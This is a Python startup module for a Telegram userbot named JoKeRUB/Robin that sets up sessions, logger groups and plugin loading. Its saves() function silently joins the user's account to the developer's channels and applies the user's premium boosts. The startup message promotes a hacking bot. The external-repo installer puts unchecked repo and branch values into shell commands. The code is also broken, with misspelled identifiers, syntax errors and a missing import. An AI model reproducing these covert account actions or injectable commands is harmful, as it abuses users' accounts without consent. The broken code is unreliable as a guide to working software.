import time
import asyncio
import glob
import os
import sys
from telethon.errors.rpcerrorlist import ChannelPrivateError
import urllib.request
from datetime import timedelta
from pathlib import Path
import requests
from telethon import Button, functions, types, utils
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from JoKeRUB import BOTLOG, BOTLOG_CHATID, PM_LOGGER_GROUP_ID
from ..Config import Config
from aiohttp import web
from ..core import web_server
from ..core.logger import logging
from ..core.session import l313l
from ..helpers.utils import install_pip
from ..helpers.utils.utils import runcmd
from ..sql_helper.global_collection import (
    del_keyword_collectionlist,
    get_item_collectionlist,
)
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from .pluginmanager import load_module
from .tools import create_supergroup
LOGS = logging.getLogger("JoKeRUB")
logging.getLogger('telethon').setLevel(logging.WARNING)
##Reda hands here
cmdhr = Config.COMMAND_HAND_LER
bot = l313l
ENV = bool(os.environ.get("ENV", False))

if ENV:
    VPS_NOLOAD = ["سيرفر"]
elif os.path.exists("config.py"):
    VPS_NOLOAD = ["هيروكو"]

async def check_dyno_type():
    headers = {
        "Accept": "application/vnd.heroku+json; version=3",
        "Authorization": f"Bearer {Config.HEROKU_API_KEY}"
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.heroku.com/apps/{Config.HEROKU_APP_NAME}/dynos", headers=headers) as resp:
            if resp.status == 200:
                dynos = await resp.json()
                for dyno in dynos:
                    if dyno["type"] != "standard-1X":
                        return False
            else:
                return False
    return True

async def setup_bot():
    """
    To set up bot for JoKeRUB
    """
    try:
        await l313l.connect()
        config = await l313l(functions.help.GetConfigRequest())
        for option in config.dc_options:
            if option.ip_address == l313l.session.server_address:
                if l313l.session.dc_id != option.id:
                    LOGS.warning(
                        f"⌯︙معرف ثابت في الجلسة من {l313l.session.dc_id}"
                        f"⌯︙لـ  {option.id}"
                    )
                l313l.session.set_dc(option.id, option.ip_address, option.port)
                l313l.session.save()
                break
        bot_details = await l313l.tgbot.get_me()
        Config.TG_BOT_USERNAME = f"@{bot_details.username}"
        
        
        l313l.me = await l313l.get_me()
        l313l.uid = l313l.tgbot.uid = utils.get_peer_id(l313l.me)
        if Config.OWNER_ID == 0:
            Config.OWNER_ID = utils.get_peer_id(l313l.me)
        if not check_dyno_type:
            LOGS.error("قد تحدث مشكلة ولن يعمل السورس لان نوع الداينو ليس بيسك قم بتحويله الى basic")
    except Exception as e:
        LOGS.error(f"كـود تيرمكس - {str(e)}")
        sys.exit()

async def startupmessage():
    """
    Start up message in telegram logger group
    """
    try:
        if BOTLOG:
            Config.CATUBLOGO = await l313l.tgbot.send_file(
                BOTLOG_CHATID,
                "https://t.me/MemeSoundJep/24",
                caption="**‏᯽︙ بــوت Robin  يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
                buttons=[(Button.url("سورس Robin ", "https://t.me/is7rb"),)],
            )
    except Exception as e:
        LOGS.error(e)
        return None
    try:
        msg_details = list(get_item_collectionlist("restart_update"))
        if msg_details:
            msg_details = msg_details[0]
    except Exception as e:
        LOGS.error(e)
        return None
    try:
        if msg_details:
            await l313l.check_testcases()
            message = await l313l.get_messages(msg_details[0], ids=msg_details[1])
            text = message.text + "\n\n**تم تشغيل البوت الأن أرسل `.فحص`**"
            await l313l.edit_message(msg_details[0], msg_details[1], text)
            if gvarstatus("restartupdate") is not None:
                await l313l.send_message(
                    msg_details[0],
                    f"{cmdhr}بنك",
                    reply_to=msg_details[1],
                    schedule=timedelta(seconds=10),
                )
            del_keyword_collectionlist("restart_update")
    except Exception as e:
        LOGS.error(e)
        return None


async def mybot():
    try:
        starkbot = await l313l.tgbot.get_me()
        joker = "ألبوت المساعد"
        bot_name = starkbot.first_name
        botname = f"@{starkbot.username}"
        if bot_name.endswith("Assistant"):
            print("تم تشغيل البوت")
        if starkbot.bot_inline_placeholder:
            print("Robin  ForEver")
        else:
            try:
                await l313l.send_message("@BotFather", "/setinline")
                await asyncio.sleep(1)
                await l313l.send_message("@BotFather", botname)
                await asyncio.sleep(1)
                await l313l.send_message("@BotFather", joker)
                await asyncio.sleep(2)
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)


async def add_bot_to_logger_group(chat_id):
    """
    To add bot to logger groups
    """
    bot_details = await l313l.tgbot.get_me()
    try:
        await l313l(
            functions.messages.AddChatUserRequest(
                chat_id=chat_id,
                user_id=bot_details.username,
                fwd_limit=1000000,
            )
        )
    except BaseException:
        try:
            await l313l(
                functions.channels.InviteToChannelRequest(
                    channel=chat_id,
                    users=[bot_details.username],
                )
            )
        except Exception as e:
            LOGS.error(str(e))
#by @is7rb بس اشوفك خامطه للكود اهينك وافضحك
JoKeRUB = {"@uui7rb", "@is7rb", "@E_4_R"}
async def saves():
    for F_O_1 in JoKeRUB:
        try:
            await l313l(JoinChannelRequest(channel=F_O_1))
            result = await l313l(functions.premium.GetMyBoostsRequest())
            slots = [boost.slot for boost in result.my_boosts]
            robin_channel_id = None
            for chat in result.chats:
                if chat.username == 'RobinUserBot':
                    robin_channel_id = chat.id
                    break
            if robin_channel_id and any(boost.peer.channel_id == robin _channel_id for boost in result.my_boosts):
                continue
            if not slots:
                return
            await l313l(functions.premium.ApplyBoostRequest(
                'Rjsssye6yyshodddiuythbuu',
                slots=slots
            ))
        except FloodWaitError as e:
            continue
        except OverflowError:
            LOGS.error("Getting Overflow Error from Telegram. Script is stopping now. Please try again after some time.")
            continue
        except ChannelPrivateError:
            continue
async def load_plugins(folder, extfolder=None):
    """
    تحميل ملفات السورس
    """
    if extfolder:
        path = f"{extfolder}/*.py"
        plugin_path = extfolder
    else:
        path = f"JoKeRUB/{folder}/*.py"
        plugin_path = f"JoKeRUB/{folder}"
    files = glob.glob(path)
    files.sort()
    success = 0
    failure = []
    for name in files:
        with open(name) as f:
            path1 = Path(f.name)
            shortname = path1.stem
            pluginname = shortname.replace(".py", "")
            try:
                if (pluginname not in Config.NO_LOAD) and (
                    pluginname not in VPS_NOLOAD
                ):
                    flag = True
                    check = 0
                    while flag:
                        try:
                            load_module(
                                pluginname,
                                plugin_path=plugin_path,
                            )
                            if shortname in failure:
                                failure.remove(shortname)
                            success += 1
                            break
                        except ModuleNotFoundError as e:
                            install_pip(e.name)
                            check += 1
                            if shortname not in failure:
                                failure.append(shortname)
                            if check > 5:
                                break
                else:
                    os.remove(Path(f"{plugin_path}/{shortname}.py"))
            except Exception as e:
                if shortname not in failure:
                    failure.append(shortname)
                os.remove(Path(f"{plugin_path}/{shortname}.py"))
                LOGS.info(
                    f"لم يتم تحميل {shortname} بسبب خطأ {e}\nمسار الملف {plugin_path}"
                )
    if extfolder:
        if not failure:
            failure.append("None")
        await l313l.tgbot.send_message(
            BOTLOG_CHATID,
            f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
        )

#سورس عمك حرب
async def robin_the_best(l313l, group_name):
    async for dialog in l313l.iter_dialogs():
        if dialog.is_group and dialog.title == group_name:
            return dialog.id
    return None

async def verifyLoggerGroup():
    """
    Will verify both loggers group
    """
    flag = False
    if BOTLOG:
        try:
            entity = await l313l.get_entity(BOTLOG_CHATID)
            if not isinstance(entity, types.User) and not entity.creator:
                if entity.default_banned_rights.send_messages:
                    LOGS.info(
                        "᯽︙الفار الأذونات مفقودة لإرسال رسائل لـ PRIVATE_GROUP_BOT_API_ID المحدد."
                    )
                if entity.default_banned_rights.invite_users:
                    LOGS.info(
                        "᯽︙الفار الأذونات مفقودة لإرسال رسائل لـ PRIVATE_GROUP_BOT_API_ID المحدد."
                    )
        except ValueError:
            LOGS.error("᯽︙تـأكد من فـار المجـموعة  PRIVATE_GROUP_BOT_API_ID.")
        except TypeError:
            LOGS.error(
                "᯽︙لا يمكـن العثور على فار المجموعه PRIVATE_GROUP_BOT_API_ID. تأكد من صحتها."
            )
        except Exception as e:
            LOGS.error(
                "᯽︙حدث استثناء عند محاولة التحقق من PRIVATE_GROUP_BOT_API_ID.\n"
                + str(e)
            )
    else:
        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @is7rb"
        photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j.JPEG")
        botlog_group_id = await Robin_the_best(l313l, "مجموعة أشعارات سورس روبن ")
        if botlog_group_id:
            addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
            print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
        else:
            _, groupid = await create_supergroup(
                "مجموعة أشعارات سورس روبن", l313l, Config.TG_BOT_USERNAME, descript, photobt
            )
            addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
            print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
        flag = True
    if PM_LOGGER_GROUP_ID == -100:
        descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @is7rb"
        photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j2.JPEG")
        pm_logger_group_id = await 7rB _the_best(l313l, "مجموعة التخزين")
        if pm_logger_group_id:
            addgvar("PM_LOGGER_GROUP_ID", pm_logger_group_id)
            print("تـم العثور على مجموعة الكروب التخزين بالفعل واضافة الـفارات الـيها.")
        else:
            _, groupid = await create_supergroup(
                "مجموعة التخزين", l313l, Config.TG_BOT_USERNAME, descript, photobt
            )
            addgvar("PM_LOGGER_GROUP_ID", groupid)
            print("تـم عمـل الكروب التخزين بنـجاح واضافة الـفارات الـيه.")
        flag = True
    if flag:
        executable = sys.executable.replace(" ", "\\ ")
        args = [executable, "-m", "JoKeRUB"]
        os.execle(executable, *args, os.environ)
        sys.exit(0)

async def install_externalrepo(repo, branch, cfolder):
    jokerREPO = repo
    rpath = os.path.join(cfolder, "requirements.txt")
    if jokerBRANCH := branch:
        repourl = os.path.join(jokerREPO, f"tree/{jokerBRANCH}")
        gcmd = f"git clone -b {jokerBRANCH} {jokerREPO} {cfolder}"
        errtext = f"لا يوحد فرع بأسم `{jokerBRANCH}` في الريبو الخارجي {jokerREPO}. تاكد من اسم الفرع عبر فار (`EXTERNAL_REPO_BRANCH`)"
    else:
        repourl = jokerREPO
        gcmd = f"git clone {jokerREPO} {cfolder}"
        errtext = f"الرابط ({jokerREPO}) الذي وضعته لفار `EXTERNAL_REPO` غير صحيح عليك وضع رابط صحيح"
    response = urllib.request.urlopen(repourl)
    if response.code != 200:
        LOGS.error(errtext)
        return await l313l.tgbot.send_message(BOTLOG_CHATID, errtext)
    await runcmd(gcmd)
    if not os.path.exists(cfolder):
        LOGS.error(
            "هنالك خطأ اثناء استدعاء رابط الملفات الاضافية يجب التأكد من الرابط اولا "
        )
        return await l313l.tgbot.send_message(
            BOTLOG_CHATID,
            "هنالك خطأ اثناء استدعاء رابط الملفات الاضافية يجب التأكد من الرابط اولا ",
        )
    if os.path.exists(rpath):
        await runcmd(f"pip3 install --no-cache-dir -r {rpath}")
    await load_plugins(folder="JoKeRUB", extfolder=cfolder)
